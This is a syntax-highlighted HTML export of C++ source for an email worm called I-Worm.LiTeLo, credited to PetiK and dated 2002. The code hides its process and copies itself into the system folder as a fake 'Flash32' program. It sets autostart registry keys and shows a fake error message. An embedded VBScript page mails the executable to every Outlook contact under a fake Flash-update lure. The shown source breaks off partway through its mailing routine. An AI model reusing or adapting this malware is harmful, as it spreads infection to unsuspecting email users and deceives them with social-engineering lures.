<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
Name : I-Worm.LiTeLo
Author : PetiK
Date : March 7th 2002 - March 10th 2002
Language : C++/HTML
*/</span><span class="sc0">

</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;mapi.h&gt;
#pragma argused
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">copysys</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">copyreg</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">htmf</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">fakemess</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">LPSTR</span><span class="sc0">   </span><span class="sc11">Run</span><span class="sc10">=</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">Uninst</span><span class="sc10">=</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\LiteLo"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">dn</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">]=</span><span class="sc6">"Flash32 Uninstall"</span><span class="sc10">,</span><span class="sc11">ust</span><span class="sc10">[</span><span class="sc4">40</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">BYTE</span><span class="sc0">    </span><span class="sc11">htmail</span><span class="sc10">[</span><span class="sc4">10</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0">   </span><span class="sc11">Tmp</span><span class="sc10">,</span><span class="sc19">type</span><span class="sc10">=</span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc11">shtmail</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">htmail</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">LPTSTR</span><span class="sc0">  </span><span class="sc11">cmdLine</span><span class="sc10">,</span><span class="sc19">ptr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0">    </span><span class="sc11">installed</span><span class="sc10">,</span><span class="sc11">uninstall</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">kernel32</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc0">    </span><span class="sc10">*</span><span class="sc11">htm</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">session</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mess</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">WiNet</span><span class="sc10">,</span><span class="sc11">hMAPI</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">messId</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">],</span><span class="sc11">mname</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">maddr</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">];</span><span class="sc0">


</span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">htmms</span><span class="sc10">[]=</span><span class="sc6">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Flash Information&lt;/title&gt;&lt;/head&gt;\n"</span><span class="sc0">
        </span><span class="sc6">"&lt;body&gt;&lt;script language=vbscript&gt;\n"</span><span class="sc0">
        </span><span class="sc6">"On Error Resume Next\n"</span><span class="sc0">
        </span><span class="sc6">"msgbox \"Please accept ActiveX by clicking YES\",vbinformation,\"Flash32 NET\"\n"</span><span class="sc0">
        </span><span class="sc6">"Set abcgqlbg=CreateObject(\"Scripting.FileSystemObject\")\n"</span><span class="sc0">
        </span><span class="sc6">"Set gqlbgrlb=CreateObject(\"WScript.Shell\")\n\n"</span><span class="sc0">
        </span><span class="sc6">"If err.number=429 Then\n"</span><span class="sc0">
        </span><span class="sc6">"gqlbgrlb.Run javascript:location.reload()\n\n"</span><span class="sc0">
        </span><span class="sc6">"Else\n\n"</span><span class="sc0">
        </span><span class="sc6">"mess=\"Contact :\"\n"</span><span class="sc0">
        </span><span class="sc6">"Set bgqlbgqm=CreateObject(\"Outlook.Application\")\n"</span><span class="sc0">
        </span><span class="sc6">"Set mbgqlbgq=bgqlbgqm.GetNameSpace(\"MAPI\")\n"</span><span class="sc0">
        </span><span class="sc6">"For Each C In mbgqlbgq.AddressLists\n"</span><span class="sc0">
        </span><span class="sc6">"If C.AddressEntries.Count &lt;&gt; 0 Then\n"</span><span class="sc0">
        </span><span class="sc6">"For D=1 To C.AddressEntries.Count\n"</span><span class="sc0">
        </span><span class="sc6">"Set qlbgqlbg=C.AddressEntries(D)\n"</span><span class="sc0">
        </span><span class="sc6">"Set gqlcgqlb=bgqlbgqm.CreateItem(0)\n"</span><span class="sc0">
        </span><span class="sc6">"mess=mess &amp;vbCrLf&amp; qlbgqlbg.Address\n"</span><span class="sc0">
        </span><span class="sc6">"gqlcgqlb.To=qlbgqlbg.Address\n"</span><span class="sc0">
        </span><span class="sc6">"gqlcgqlb.Subject=\"New Version of Flash.\"\n"</span><span class="sc0">
        </span><span class="sc6">"gqlcgqlb.Body=\"Unlimited demo verion of Flash.\"\n"</span><span class="sc0">
        </span><span class="sc6">"gqlcgqlb.Attachments.Add(abcgqlbg.GetSpecialFolder(1)&amp;\"\\Flash32.exe\")\n"</span><span class="sc0">
        </span><span class="sc6">"gqlcgqlb.DeleteAfterSubmit=True\n"</span><span class="sc0">
        </span><span class="sc6">"If gqlcgqlb.To &lt;&gt; \"\" Then\n"</span><span class="sc0">
        </span><span class="sc6">"gqlcgqlb.Send\n"</span><span class="sc0">
        </span><span class="sc6">"End If\n"</span><span class="sc0">
        </span><span class="sc6">"Next\n"</span><span class="sc0">
        </span><span class="sc6">"End If\n"</span><span class="sc0">
        </span><span class="sc6">"Next\n\n"</span><span class="sc0">
        </span><span class="sc6">"MsgBox mess,vbinformation,\"Flash Contact\"\n"</span><span class="sc0">
        </span><span class="sc6">"gqlbgrlb.RegWrite \"HKLM\\Software\\Microsoft\\HTMail\",\"OK\"\n"</span><span class="sc0">
        </span><span class="sc6">"gqlbgrlb.Run javascript:location.href=(\"http://www.flash.com\")\n"</span><span class="sc0">
        </span><span class="sc6">"End If\n"</span><span class="sc0">
        </span><span class="sc6">"&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">attname</span><span class="sc10">[]={</span><span class="sc6">"flash32.exe"</span><span class="sc10">,</span><span class="sc6">"flsh32eng.exe"</span><span class="sc10">,</span><span class="sc6">"flsh32fr.exe"</span><span class="sc10">,</span><span class="sc6">"new_flash.exe"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"freeflash32.exe"</span><span class="sc10">,</span><span class="sc6">"installflash.exe"</span><span class="sc10">,</span><span class="sc6">"setupflash.exe"</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">HKEY</span><span class="sc0">        </span><span class="sc11">hReg</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">SYSTEMTIME</span><span class="sc0">  </span><span class="sc11">systime</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">INetConnect</span><span class="sc10">)(</span><span class="sc11">LPDWORD</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">reserved</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">RegSerPro</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mSendMail</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapiMessage</span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mLogoff</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mLogon</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPLHANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mFindNext</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mReadMail</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lpMapiMessage</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mFreeBuffer</span><span class="sc10">)(</span><span class="sc11">LPVOID</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrev</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpCmd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

</span><span class="sc11">kernel32</span><span class="sc10">=</span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc6">"KERNEL32.DLL"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">kernel32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">RegSerPro</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">kernel32</span><span class="sc10">,</span><span class="sc6">"RegisterServiceProcess"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegSerPro</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">RegSerPro</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">GetSystemDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">copysys</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">htmf</span><span class="sc10">,</span><span class="sc11">copysys</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">copysys</span><span class="sc10">,</span><span class="sc6">"\\Flash32.exe"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">htmf</span><span class="sc10">,</span><span class="sc6">"\\FlashNet.htm"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">installed</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">uninstall</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">cmdLine</span><span class="sc10">=</span><span class="sc11">GetCommandLine</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">cmdLine</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc19">ptr</span><span class="sc10">=</span><span class="sc11">cmdLine</span><span class="sc10">;</span><span class="sc19">ptr</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]!=</span><span class="sc7">'-'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc19">ptr</span><span class="sc10">++);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc19">ptr</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'-'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc19">ptr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'i'</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc11">installed</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'u'</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc11">installed</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">uninstall</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">installed</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">copysys</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">copyreg</span><span class="sc10">,</span><span class="sc11">copysys</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">copyreg</span><span class="sc10">,</span><span class="sc6">" -i"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc11">Run</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,&amp;</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"Flash32"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">copyreg</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">ust</span><span class="sc10">,</span><span class="sc11">copysys</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">ust</span><span class="sc10">,</span><span class="sc6">" -u"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc11">Uninst</span><span class="sc10">,&amp;</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"DisplayName"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">dn</span><span class="sc10">,</span><span class="sc4">20</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"UninstallString"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">ust</span><span class="sc10">,</span><span class="sc4">40</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">htm</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">htmf</span><span class="sc10">,</span><span class="sc6">"w"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">htm</span><span class="sc10">,</span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc11">htmms</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">htm</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"Error : cannot open flash32.dll"</span><span class="sc10">,</span><span class="sc6">"ERROR"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">|</span><span class="sc11">MB_ICONSTOP</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">uninstall</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc11">Run</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_ALL_ACCESS</span><span class="sc10">,&amp;</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteValue</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"Flash32"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_ALL_ACCESS</span><span class="sc10">,&amp;</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"LiteLo"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_ALL_ACCESS</span><span class="sc10">,&amp;</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteValue</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"HTMail"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">htmf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WritePrivateProfileString</span><span class="sc10">(</span><span class="sc6">"rename"</span><span class="sc10">,</span><span class="sc6">"NUL"</span><span class="sc10">,</span><span class="sc11">copysys</span><span class="sc10">,</span><span class="sc6">"WININIT.INI"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"Please restart the system."</span><span class="sc10">,</span><span class="sc6">"Uninstall Flash32"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">|</span><span class="sc11">MB_ICONHAND</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">ExitWindowsEx</span><span class="sc10">(</span><span class="sc11">EWX_REBOOT</span><span class="sc10">|</span><span class="sc11">EWX_FORCE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">// Check if we are connected
</span><span class="sc11">WiNet</span><span class="sc10">=</span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc6">"WININET.DLL"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">WiNet</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cworm</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">INetConnect</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">WiNet</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"InternetGetConnectedState"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">INetConnect</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">WiNet</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cworm</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">INetConnect</span><span class="sc10">(&amp;</span><span class="sc11">Tmp</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">)!=</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">WiNet</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"HTMail"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc19">type</span><span class="sc10">,</span><span class="sc11">htmail</span><span class="sc10">,&amp;</span><span class="sc11">shtmail</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">htmail</span><span class="sc10">,</span><span class="sc6">"OK"</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
